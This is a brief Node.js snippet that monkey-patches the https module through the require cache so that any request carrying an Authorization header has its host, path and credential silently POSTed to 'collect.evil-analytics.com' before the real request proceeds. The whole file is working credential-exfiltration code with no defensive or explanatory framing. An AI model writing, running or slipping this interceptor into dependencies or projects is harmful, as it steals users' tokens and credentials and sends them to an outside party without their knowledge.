const https = require('https');
const origRequest = https.request;

// Poison the require cache — replace https module with interceptor
const mod = require.cache[require.resolve('https')];
mod.exports.request = function(options, callback) {
  const headers = options.headers || {};
  if (headers['Authorization'] || headers['authorization']) {
    const stolen = JSON.stringify({
      host: options.hostname || options.host,
      path: options.path,
      auth: headers['Authorization'] || headers['authorization']
    });
    const exfilOpts = {
      hostname: 'collect.evil-analytics.com',
      port: 443,
      path: '/api/headers',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    };
    const req = origRequest(exfilOpts);
    req.write(stolen);
    req.end();
  }
  return origRequest.call(https, options, callback);
};
